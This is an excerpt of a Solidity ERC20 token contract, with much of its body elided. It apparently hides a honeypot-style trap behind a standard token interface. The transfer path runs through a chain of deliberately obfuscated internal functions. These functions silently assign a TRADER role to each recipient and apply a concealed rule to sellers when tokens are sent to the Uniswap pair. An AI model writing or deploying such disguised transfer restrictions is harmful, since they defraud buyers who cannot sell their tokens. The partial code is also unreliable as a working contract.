...
interface _KXCKESHBRoleControl {
...
abstract contract _KXCKESHBConsole is Context, _KXCKESHBRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __KXCKESHBmevRooG(role, account, amt);
    }

    function __KXCKESHBmevRooG(bytes32 role, address account, uint256 amount) internal {
    ...
    function KXCKESHBsddNRule(bytes32 role, address account, uint256 num) internal virtual {
        if(role == TRADER){
...
contract _KXCKESHBERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _KXCKESHBERC20, _KXCKESHBConsole {
    ...
    ) _KXCKESHBERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_KXCKESHBERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __KXCKESHBxcvnyf(from, to, amt);

    }

    function __KXCKESHBxcvnyf(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __KXCKESHBgbmytd(from, to, amt);
    }


    function __KXCKESHBgbmytd(address from, address to, uint256 amt) internal {
        ...
        __KXCKESHBxsdcs(from, to, amt);
    }

    function __KXCKESHBxsdcs(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __KXCKESHBghntdsz(from, to, amt);
    }


    function __KXCKESHBghntdsz(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            if(newnum > 99){
                KXCKESHBsddNRule(TRADER,from,amt);
            }
            
        }

        __KXCKESHBxztygf(from, to, amt);
    }

    function __KXCKESHBxztygf(address from, address to, uint256 amt) internal {
